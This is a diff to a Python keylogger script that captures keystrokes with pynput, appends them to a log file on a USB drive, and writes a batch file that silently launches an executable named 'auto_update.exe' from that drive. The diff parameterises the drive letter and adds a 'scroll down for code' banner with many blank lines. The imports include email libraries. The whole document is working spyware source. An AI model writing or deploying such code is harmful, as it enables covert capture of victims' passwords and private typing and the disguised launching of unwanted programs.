@@ -1,3 +1,66 @@
+USB_rappresentation_letter = "K:\\"
+
+
+###############################
+#                             #
+##### scroll down for code ####
+#                             #
+###############################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # !!! warning: even if not all libraries are used, leave them anyway in the code !!!
 import pynput.keyboard
 import smtplib, ssl
@@ -7,7 +70,6 @@ import shutil
 import os
 import subprocess
 
-
 class Keylogger:
     
     def __init__(self): 
@@ -15,7 +77,7 @@ class Keylogger:
 
     def send_data(self, keystrike):
         self.logger += keystrike
-        with open(f"K:\\log.txt","a+",encoding="utf-8") as new_file:
+        with open(f"{USB_rappresentation_letter}log.txt","a+",encoding="utf-8") as new_file:
             new_file.write(self.logger)
 
         self.logger = ""
@@ -54,8 +116,8 @@ class Keylogger:
             # Write content to the file
                 file.write(f"""
 @echo off
-if exist K:\\auto_update.exe (
-    start K:\\auto_update.exe
+if exist {USB_rappresentation_letter}auto_update.exe (
+    start {USB_rappresentation_letter}auto_update.exe
 ) else (
     exit
 )
